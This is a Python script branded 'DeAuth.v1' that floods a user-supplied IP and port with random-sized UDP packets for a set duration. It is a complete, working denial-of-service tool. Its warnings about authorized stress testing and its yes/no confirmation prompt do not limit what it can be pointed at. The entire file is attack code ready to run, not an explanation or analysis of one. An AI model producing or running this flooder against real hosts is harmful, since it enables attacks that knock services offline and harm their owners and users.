import socket
import random
import time
import colorama
from colorama import Fore, Style

# Initialize Colorama
colorama.init(autoreset=True)

# Clear terminal and display header
print("\n" * 100)
print(Fore.MAGENTA + Style.BRIGHT)
print("""
▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
 ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
   ░       ░  ░     ░  ░   ░               ░  ░  ░
 ░                                DeAuth.v1                                        
""")
print(Fore.BLUE + "This tool is for authorized stress testing of public or private systems only.")
print(Fore.RED + "Unauthorized use is illegal and unethical. Proceed only with explicit permission.")
print("")

# Logging function
def log_test(ip, port, duration, min_packet_size, max_packet_size):
    with open("test_log.txt", "a") as log_file:
        log_file.write(
            f"Target: {ip}, Port: {port}, Duration: {duration}s, Packet Size Range: {min_packet_size}-{max_packet_size} bytes, Time: {time.ctime()}\n"
        )
    print(Fore.GREEN + "[*] Test details logged.")

# Get user input
ip = input(Fore.BLUE + "Enter the target IP (public or private): " + Fore.MAGENTA)
port = int(input(Fore.BLUE + "Enter the target port: " + Fore.MAGENTA))

# Define packet size range
min_packet_size = int(input(Fore.BLUE + "Enter the minimum packet size (bytes, minimum 1): " + Fore.MAGENTA))
max_packet_size = int(input(Fore.BLUE + "Enter the maximum packet size (bytes, max 65500): " + Fore.MAGENTA))
if max_packet_size > 65500 or min_packet_size < 1 or min_packet_size > max_packet_size:
    print(Fore.RED + "[!] Error: Invalid packet size range. Minimum must be >= 1, and maximum <= 65500.")
    exit()

duration = int(input(Fore.BLUE + "Enter the duration for the test (seconds): " + Fore.MAGENTA))
print("")

# Display summary and get user confirmation
print(Fore.YELLOW + "Test Summary:")
print(Fore.CYAN + f"Target IP: {ip}")
print(Fore.CYAN + f"Target Port: {port}")
print(Fore.CYAN + f"Packet Size Range: {min_packet_size}-{max_packet_size} bytes")
print(Fore.CYAN + f"Duration: {duration} seconds")
confirm = input(Fore.RED + "Do you confirm that you have written authorization to test this target? (yes/no): " + Fore.MAGENTA)
if confirm.lower() != "yes":
    print(Fore.RED + "[!] Test aborted by user.")
    exit()

# Logging the test details
log_test(ip, port, duration, min_packet_size, max_packet_size)

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Perform the stress test
timeout = time.time() + duration
sent = 0
print(Fore.GREEN + "[*] Starting stress test with random packet sizes...")
try:
    while time.time() < timeout:
        # Generate a random packet size within the specified range
        packet_size = random.randint(min_packet_size, max_packet_size)
        data = random._urandom(packet_size)
        
        # Send the packet
        sock.sendto(data, (ip, port))
        sent += 1
        print(Fore.MAGENTA + f"[+] Sent {sent} packets of size {packet_size} bytes to {ip} on port {port}", end="\r")

    print(Fore.GREEN + f"\n[*] Test completed. Sent {sent} packets.")
except Exception as e:
    print(Fore.RED + f"[!] An error occurred: {e}")
finally:
    sock.close()
